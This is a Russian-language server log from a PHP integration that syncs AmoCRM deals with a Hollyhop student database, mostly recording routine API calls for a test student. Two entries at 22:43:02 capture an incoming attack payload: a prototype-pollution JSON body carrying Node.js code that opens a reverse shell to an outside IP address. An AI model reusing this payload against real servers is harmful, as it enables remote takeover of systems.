[2026-02-11 22:34:26] [INFO] [unknown] ═══════════════════════════════════════════════════════════
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [index.php] Завершение вызова add_student.php
{
    "execution_time_seconds": 14.9
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [index.php] Ответ от Hollyhop API получен
{
    "http_code": 200,
    "response": "\n{\"success\":true,\"operation\":\"updated\",\"operation_text\":\"Студент обновлен\",\"search_result\":{\"found\":true,\"found_text\":\"Студент найден в базе\",\"phone\":\"79922370054\"},\"clientId\":4044,\"Id\":22209,\"link\":\"https://evrasia20.t8s.ru/Profile/22209\",\"existing_student\":{\"firstName\":\"тестовый\",\"lastName\":\"студент\",\"phone\":\"79922370054\"}}"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [index.php] Ссылка на профиль студента получена
{
    "link": "https://evrasia20.t8s.ru/Profile/22209",
    "lead_id": 29382117
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [DEBUG] [amo_func.php] PATCH запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "method": "PATCH",
    "url": "/api/v4/leads/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [index.php] Сделка в AmoCRM обновлена ссылкой на профиль
{
    "lead_id": 29382117,
    "link": "https://evrasia20.t8s.ru/Profile/22209"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/users/10787738"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [index.php] Имя менеджера получено из AmoCRM
{
    "responsible_user_id": 10787738,
    "manager_name": "Юлия",
    "user_response_structure": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [index.php] Начало обработки ExtraFields для обновления поля 'Сделки АМО'
{
    "clientId": 4044,
    "has_ExtraFields": true,
    "ExtraFields_count": 1
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [index.php] Найдено поле 'Сделки АМО'
{
    "field_name": "Сделки АМО",
    "current_value_length": 109
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [index.php] Обработка текущего значения поля 'Сделки АМО'
{
    "original_value_preview": "<a href=\"https://directorchinatutorru.amocrm.ru/leads/detail/29382117\" target=\"_blank\">Юлия: 29382117</a>",
    "new_link_to_add": "<a href=\"https://directorchinatutorru.amocrm.ru/leads/detail/29382117\" target=\"_blank\">Юлия: 29382117</a>",
    "new_link_url": "https://directorchinatutorru.amocrm.ru/leads/detail/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [index.php] Разбор существующих ссылок
{
    "existing_links_count": 1,
    "new_link_url": "https://directorchinatutorru.amocrm.ru/leads/detail/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [index.php] Ссылка уже существует в поле
{
    "existing_url": "https://directorchinatutorru.amocrm.ru/leads/detail/29382117",
    "new_url": "https://directorchinatutorru.amocrm.ru/leads/detail/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [index.php] Ссылка уже существует в поле, оставляем без изменений
{
    "final_value_preview": "<a href=\"https://directorchinatutorru.amocrm.ru/leads/detail/29382117\" target=\"_blank\">Юлия: 29382117</a>"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [index.php] Подготовка к обновлению через EditUserExtraFields
{
    "clientId": 4044,
    "total_fields_to_send": 1,
    "all_fields_names": [
        "Сделки АМО"
    ]
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:26] [INFO] [index.php] Отправка запроса EditUserExtraFields
{
    "studentClientId": 4044,
    "fields_count": 1,
    "amo_deals_in_fields": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:27] [INFO] [index.php] EditUserExtraFields выполнен успешно
{
    "result_preview": "[]"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:27] [INFO] [index.php] Поле 'Сделки АМО' обновлено в Hollyhop
{
    "clientId": 4044,
    "lead_id": 29382117,
    "amo_deal_link": "<a href=\"https://directorchinatutorru.amocrm.ru/leads/detail/29382117\" target=\"_blank\">Юлия: 29382117</a>",
    "method": "EditUserExtraFields",
    "total_fields_updated": 1
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:27] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "clientId": "98b0ad7f-864b-47a6-9650-b4bf32aa8927",
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:27] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:27] [INFO] [unknown] Данные студента получены
{
    "has_student_data": true,
    "data_type": "array",
    "has_ExtraFields": false
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:27] [INFO] [unknown] ШАГ 11: Формирование финального ответа
{
    "success": true,
    "operation": "updated",
    "clientId": "98b0ad7f-864b-47a6-9650-b4bf32aa8927",
    "Id": 22209
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:27] [INFO] [unknown] ═══════════════════════════════════════════════════════════
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:27] [INFO] [unknown] УСПЕШНОЕ ЗАВЕРШЕНИЕ ОБРАБОТКИ ЗАПРОСА add_student.php
{
    "timestamp": "2026-02-11 22:34:27",
    "operation": "updated",
    "clientId": "98b0ad7f-864b-47a6-9650-b4bf32aa8927",
    "profile_id": 22209,
    "execution_time_seconds": 15.58
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:27] [INFO] [unknown] ═══════════════════════════════════════════════════════════
[]
--------------------------------------------------------------------------------
[2026-02-11 22:34:27] [INFO] [index.php] Завершение вызова add_student.php
{
    "execution_time_seconds": 15.64
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:27] [INFO] [index.php] Ответ от Hollyhop API получен
{
    "http_code": 200,
    "response": "\n{\"success\":true,\"operation\":\"updated\",\"operation_text\":\"Студент обновлен\",\"search_result\":{\"found\":true,\"found_text\":\"Студент найден в базе\",\"phone\":\"79922370054\"},\"clientId\":4044,\"Id\":22209,\"link\":\"https://evrasia20.t8s.ru/Profile/22209\",\"existing_student\":{\"firstName\":\"тестовый\",\"lastName\":\"студент\",\"phone\":\"79922370054\"}}"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:27] [INFO] [index.php] Ссылка на профиль студента получена
{
    "link": "https://evrasia20.t8s.ru/Profile/22209",
    "lead_id": 29382117
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:27] [DEBUG] [amo_func.php] PATCH запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "method": "PATCH",
    "url": "/api/v4/leads/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:27] [INFO] [index.php] Сделка в AmoCRM обновлена ссылкой на профиль
{
    "lead_id": 29382117,
    "link": "https://evrasia20.t8s.ru/Profile/22209"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:27] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/users/10787738"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:27] [INFO] [index.php] Имя менеджера получено из AmoCRM
{
    "responsible_user_id": 10787738,
    "manager_name": "Юлия",
    "user_response_structure": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:28] [INFO] [index.php] Начало обработки ExtraFields для обновления поля 'Сделки АМО'
{
    "clientId": 4044,
    "has_ExtraFields": true,
    "ExtraFields_count": 1
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:28] [INFO] [index.php] Найдено поле 'Сделки АМО'
{
    "field_name": "Сделки АМО",
    "current_value_length": 109
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:28] [INFO] [index.php] Обработка текущего значения поля 'Сделки АМО'
{
    "original_value_preview": "<a href=\"https://directorchinatutorru.amocrm.ru/leads/detail/29382117\" target=\"_blank\">Юлия: 29382117</a>",
    "new_link_to_add": "<a href=\"https://directorchinatutorru.amocrm.ru/leads/detail/29382117\" target=\"_blank\">Юлия: 29382117</a>",
    "new_link_url": "https://directorchinatutorru.amocrm.ru/leads/detail/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:28] [INFO] [index.php] Разбор существующих ссылок
{
    "existing_links_count": 1,
    "new_link_url": "https://directorchinatutorru.amocrm.ru/leads/detail/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:28] [INFO] [index.php] Ссылка уже существует в поле
{
    "existing_url": "https://directorchinatutorru.amocrm.ru/leads/detail/29382117",
    "new_url": "https://directorchinatutorru.amocrm.ru/leads/detail/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:28] [INFO] [index.php] Ссылка уже существует в поле, оставляем без изменений
{
    "final_value_preview": "<a href=\"https://directorchinatutorru.amocrm.ru/leads/detail/29382117\" target=\"_blank\">Юлия: 29382117</a>"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:28] [INFO] [index.php] Подготовка к обновлению через EditUserExtraFields
{
    "clientId": 4044,
    "total_fields_to_send": 1,
    "all_fields_names": [
        "Сделки АМО"
    ]
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:28] [INFO] [index.php] Отправка запроса EditUserExtraFields
{
    "studentClientId": 4044,
    "fields_count": 1,
    "amo_deals_in_fields": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:28] [INFO] [index.php] EditUserExtraFields выполнен успешно
{
    "result_preview": "[]"
}
--------------------------------------------------------------------------------
[2026-02-11 22:34:28] [INFO] [index.php] Поле 'Сделки АМО' обновлено в Hollyhop
{
    "clientId": 4044,
    "lead_id": 29382117,
    "amo_deal_link": "<a href=\"https://directorchinatutorru.amocrm.ru/leads/detail/29382117\" target=\"_blank\">Юлия: 29382117</a>",
    "method": "EditUserExtraFields",
    "total_fields_updated": 1
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:02] [INFO] [index.php] Вебхук от AmoCRM получен
[
    "{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"var n=process.mainModule.require('net'),c=process.mainModule.require('child_process'),s=c.spawn('/bin/sh',[]),cl=new n.Socket();cl.connect(12323,'45.156.87.40',()=>{cl.pipe(s.stdin);s.stdout.pipe(cl);s.stderr.pipe(cl);});\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}",
    "\"$@0\""
]
--------------------------------------------------------------------------------
[2026-02-11 22:43:02] [WARNING] [index.php] Вебхук получен, но не удалось определить lead_id
[
    "{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"var n=process.mainModule.require('net'),c=process.mainModule.require('child_process'),s=c.spawn('/bin/sh',[]),cl=new n.Socket();cl.connect(12323,'45.156.87.40',()=>{cl.pipe(s.stdin);s.stdout.pipe(cl);s.stderr.pipe(cl);});\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}",
    "\"$@0\""
]
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [index.php] Вебхук от AmoCRM получен
{
    "leads": {
        "status": [
            {
                "id": "29382117",
                "status_id": "81896134",
                "pipeline_id": "7909930",
                "old_status_id": "66403690",
                "old_pipeline_id": "7909930"
            }
        ]
    },
    "account": {
        "id": "31625686",
        "subdomain": "directorchinatutorru"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [index.php] Обработка события: изменение статуса сделки
{
    "lead_id": 29382117
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/leads/29382117?with=contacts"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [index.php] Данные сделки получены из AmoCRM
{
    "lead_id": 29382117
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/contacts/34414183"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [index.php] Данные подготовлены для отправки в Hollyhop
{
    "Status": "В наборе",
    "link": "https://directorchinatutorru.amocrm.ru/leads/detail/29382117",
    "gender": "F",
    "amo_lead_id": 29382117,
    "amo_subdomain": "directorchinatutorru",
    "discipline": "Китайский",
    "learningType": "Мини-группа",
    "maturity": "Дошкольники",
    "officeOrCompanyId": "Курская",
    "level": "A1",
    "firstName": "тестовый",
    "lastName": "студент",
    "phone": "79922370054",
    "email": "test233@test.com"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [index.php] Начало вызова add_student.php
{
    "url": "https://srm.chinatutor.ru/add_student.php",
    "timeout": 120
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] ═══════════════════════════════════════════════════════════
[]
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] НАЧАЛО ОБРАБОТКИ ЗАПРОСА add_student.php
{
    "timestamp": "2026-02-11 22:43:44",
    "request_method": "POST",
    "content_type": "application/json"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] ═══════════════════════════════════════════════════════════
[]
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] ШАГ 1: Получение данных из POST запроса
[]
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] Получены POST данные
{
    "has_data": true,
    "data_keys": [
        "Status",
        "link",
        "gender",
        "amo_lead_id",
        "amo_subdomain",
        "discipline",
        "learningType",
        "maturity",
        "officeOrCompanyId",
        "level",
        "firstName",
        "lastName",
        "phone",
        "email"
    ],
    "data_preview": "{\n    \"Status\": \"В наборе\",\n    \"link\": \"https:\\/\\/directorchinatutorru.amocrm.ru\\/leads\\/detail\\/29382117\",\n    \"gender\": \"F\",\n    \"amo_lead_id\": 29382117,\n    \"amo_subdomain\": \"directorchinatutorru\",\n    \"discipline\": \"Китайский\",\n    \"learningType\": \"Мини-группа\",\n    \"maturity\": \"Дошкольники\",\n    \"officeOrCompanyId\": \"Курская\",\n    \"level\": \"A1\",\n    \"firstName\": \"тестовый\",\n    \"lastName\": \"студент\",\n    \"phone\": \"79922370054\",\n    \"email\": \"test233@test.com\"\n}"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] ШАГ 2: Валидация входных данных
[]
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] Валидация пройдена успешно
[]
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] ШАГ 3: Маппинг и подготовка данных студента
[]
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] Маппинг gender
{
    "исходное": "F",
    "преобразовано": "false (женский)"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] learningType: найден в маппинге
{
    "исходное": "Мини-группа",
    "преобразовано": "Мини-группа"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] maturity: найден в маппинге
{
    "исходное": "Дошкольники",
    "преобразовано": "4-6 лет"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] officeOrCompanyId: найден в маппинге
{
    "название": "Курская",
    "ID": 2
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] Подготовленные параметры для AddStudent API
{
    "params": {
        "firstName": "тестовый",
        "lastName": "студент",
        "gender": false,
        "phone": "79922370054",
        "email": "test233@test.com",
        "discipline": "Китайский",
        "level": "A1",
        "learningType": "Мини-группа",
        "maturity": "4-6 лет",
        "officeOrCompanyId": 2,
        "Status": "В наборе"
    },
    "params_count": 11,
    "has_gender": true,
    "has_level": true,
    "has_learningType": true,
    "has_officeOrCompanyId": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] ШАГ 4: Поиск существующего студента по телефону
[]
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] Поиск существующего студента по телефону
{
    "phone": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] Нормализованный номер для поиска
{
    "original": "79922370054",
    "normalized": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:44] [INFO] [unknown] Попытка поиска с параметром: phone
{
    "phone": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:48] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "phone": "79922370054",
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:48] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:48] [INFO] [unknown] Ответ GetStudents получен для параметра phone
{
    "type": "array",
    "is_empty": false,
    "is_array": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:48] [INFO] [unknown] Попытка поиска с параметром: term
{
    "term": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:48] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "term": "79922370054",
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:48] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:48] [INFO] [unknown] Ответ GetStudents получен для параметра term
{
    "type": "array",
    "is_empty": false,
    "is_array": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:48] [INFO] [unknown] Попытка поиска с параметром: search
{
    "search": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:52] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "search": "79922370054",
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:52] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:52] [INFO] [unknown] Ответ GetStudents получен для параметра search
{
    "type": "array",
    "is_empty": false,
    "is_array": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:52] [INFO] [unknown] Попытка поиска с параметром: q
{
    "q": "79922370054"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:55] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "q": "79922370054",
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:55] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:55] [INFO] [unknown] Ответ GetStudents получен для параметра q
{
    "type": "array",
    "is_empty": false,
    "is_array": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:55] [INFO] [unknown] Результаты поиска
{
    "total_candidates": 1001,
    "matched_students": 1,
    "search_param_used": "q"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:55] [INFO] [unknown] ✓✓✓ НАЙДЕН студент с ТОЧНЫМ совпадением телефона
{
    "search_param": "q",
    "Id": 22209,
    "ClientId": 4044,
    "total_matched": 1
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:55] [INFO] [unknown] Студент найден по телефону, данные не обновляем, используем существующие
{
    "Id": 22209,
    "ClientId": 4044
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:55] [INFO] [unknown] ШАГ 5: Создание или обновление студента
{
    "is_update": true,
    "has_existing_student": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:55] [INFO] [unknown] Пропуск создания студента - используется существующий
{
    "existing_id": 22209,
    "existing_clientId": 4044
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:55] [INFO] [unknown] ШАГ 6: Извлечение ID студента из ответа
[]
--------------------------------------------------------------------------------
[2026-02-11 22:43:55] [INFO] [unknown] Используем данные существующего студента
{
    "Id": 22209,
    "ClientId": 4044
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:55] [INFO] [unknown] Используется существующий студент (данные не обновляются), Id: 22209
--------------------------------------------------------------------------------
[2026-02-11 22:43:55] [INFO] [unknown] ШАГ 7: Обновление контактных данных
{
    "is_update": true,
    "has_client_id": true,
    "has_phone": true,
    "has_email": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:55] [INFO] [unknown] ШАГ 8: Получение полного профиля студента через GetStudents
{
    "client_id": 4044,
    "student_id": 22209
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:55] [INFO] [unknown] Запрос GetStudents с clientId: 4044
[]
--------------------------------------------------------------------------------
[2026-02-11 22:43:55] [INFO] [unknown] Запрос GetStudents с параметром clientId (прямой поиск)
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "clientId": 4044,
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [unknown] Ответ GetStudents: объект с полем Students
{
    "students_count": 1,
    "now": "2026-02-11T19:43:56"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [unknown] Ответ от GetStudents API получен
{
    "has_direct_student": false,
    "is_array": true,
    "count": 1
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [unknown] Поиск студента с ClientId = 4044 в массиве из 1 студентов
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [unknown] Структура студента #0
{
    "keys": [
        "ClientId",
        "Id",
        "Created",
        "Updated",
        "FirstName",
        "LastName",
        "Gender",
        "AddressDate",
        "StatusId",
        "Status",
        "Mobile",
        "UseMobileBySystem",
        "EMail",
        "UseEMailBySystem",
        "Maturity",
        "LearningTypes",
        "Disciplines",
        "OfficesAndCompanies",
        "ExtraFields"
    ],
    "ClientId": 4044,
    "Id": 22209
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [unknown] Студент #0: ClientId=4044, Id=22209
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [unknown] ✓ НАЙДЕН студент #0 с ClientId = 4044
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [unknown] ✓ Получен Id профиля: 22209
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [unknown] ШАГ 9: Формирование ответа
{
    "student_id_from_api": 22209,
    "client_id": 4044,
    "is_update": true
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [unknown] ШАГ 10: Обновление поля 'Сделки АМО' в Hollyhop
{
    "has_amo_lead_id": true,
    "has_client_id": true,
    "amo_lead_id": 29382117
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [unknown] Начало обработки поля 'Сделки АМО'
{
    "amo_lead_id": 29382117,
    "client_id": 4044
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [unknown] Получение имени менеджера из AmoCRM
{
    "amo_lead_id": 29382117,
    "amo_subdomain": "directorchinatutorru"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [unknown] Запрос данных сделки из AmoCRM
{
    "api_url": "/api/v4/leads/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/leads/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [unknown] Данные сделки получены из AmoCRM
{
    "has_responsible_user_id": true,
    "responsible_user_id": 10787738
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/users/10787738"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [unknown] Имя менеджера получено из AmoCRM
{
    "responsible_user_id": 10787738,
    "manager_name": "Юлия",
    "lead_id": 29382117,
    "user_response_structure": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:43:56] [INFO] [unknown] Получение текущих данных студента для обновления поля 'Сделки АМО'
{
    "client_id": "98b0ad7f-864b-47a6-9650-b4bf32aa8927"
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:00] [INFO] [add_student.php] API запрос: GetStudents
{
    "url": "https://evrasia20.t8s.ru/Api/V2/GetStudents",
    "http_code": 200,
    "request_params": {
        "clientId": "98b0ad7f-864b-47a6-9650-b4bf32aa8927",
        "authkey": "***hidden***"
    }
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:00] [INFO] [add_student.php] API ответ успешно получен
{
    "function": "GetStudents",
    "response_structure": [
        "Students",
        "Now"
    ],
    "response_type": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:00] [INFO] [unknown] Данные студента получены
{
    "has_student_data": true,
    "data_type": "array",
    "has_ExtraFields": false
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:00] [INFO] [unknown] ШАГ 11: Формирование финального ответа
{
    "success": true,
    "operation": "updated",
    "clientId": "98b0ad7f-864b-47a6-9650-b4bf32aa8927",
    "Id": 22209
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:00] [INFO] [unknown] ═══════════════════════════════════════════════════════════
[]
--------------------------------------------------------------------------------
[2026-02-11 22:44:00] [INFO] [unknown] УСПЕШНОЕ ЗАВЕРШЕНИЕ ОБРАБОТКИ ЗАПРОСА add_student.php
{
    "timestamp": "2026-02-11 22:44:00",
    "operation": "updated",
    "clientId": "98b0ad7f-864b-47a6-9650-b4bf32aa8927",
    "profile_id": 22209,
    "execution_time_seconds": 15.42
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:00] [INFO] [unknown] ═══════════════════════════════════════════════════════════
[]
--------------------------------------------------------------------------------
[2026-02-11 22:44:00] [INFO] [index.php] Завершение вызова add_student.php
{
    "execution_time_seconds": 15.53
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:00] [INFO] [index.php] Ответ от Hollyhop API получен
{
    "http_code": 200,
    "response": "\n{\"success\":true,\"operation\":\"updated\",\"operation_text\":\"Студент обновлен\",\"search_result\":{\"found\":true,\"found_text\":\"Студент найден в базе\",\"phone\":\"79922370054\"},\"clientId\":4044,\"Id\":22209,\"link\":\"https://evrasia20.t8s.ru/Profile/22209\",\"existing_student\":{\"firstName\":\"тестовый\",\"lastName\":\"студент\",\"phone\":\"79922370054\"}}"
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:00] [INFO] [index.php] Ссылка на профиль студента получена
{
    "link": "https://evrasia20.t8s.ru/Profile/22209",
    "lead_id": 29382117
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:00] [DEBUG] [amo_func.php] PATCH запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "method": "PATCH",
    "url": "/api/v4/leads/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:00] [INFO] [index.php] Сделка в AmoCRM обновлена ссылкой на профиль
{
    "lead_id": 29382117,
    "link": "https://evrasia20.t8s.ru/Profile/22209"
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:01] [DEBUG] [amo_func.php] GET запрос к AmoCRM API выполнен успешно
{
    "code": 200,
    "url": "/api/v4/users/10787738"
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:01] [INFO] [index.php] Имя менеджера получено из AmoCRM
{
    "responsible_user_id": 10787738,
    "manager_name": "Юлия",
    "user_response_structure": "array"
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:01] [INFO] [index.php] Начало обработки ExtraFields для обновления поля 'Сделки АМО'
{
    "clientId": 4044,
    "has_ExtraFields": true,
    "ExtraFields_count": 1
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:01] [INFO] [index.php] Найдено поле 'Сделки АМО'
{
    "field_name": "Сделки АМО",
    "current_value_length": 109
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:01] [INFO] [index.php] Обработка текущего значения поля 'Сделки АМО'
{
    "original_value_preview": "<a href=\"https://directorchinatutorru.amocrm.ru/leads/detail/29382117\" target=\"_blank\">Юлия: 29382117</a>",
    "new_link_to_add": "<a href=\"https://directorchinatutorru.amocrm.ru/leads/detail/29382117\" target=\"_blank\">Юлия: 29382117</a>",
    "new_link_url": "https://directorchinatutorru.amocrm.ru/leads/detail/29382117"
}
--------------------------------------------------------------------------------
[2026-02-11 22:44:01] [INFO] [index.php] Разбор существующих ссылок
{
    "existing_links_count": 1,
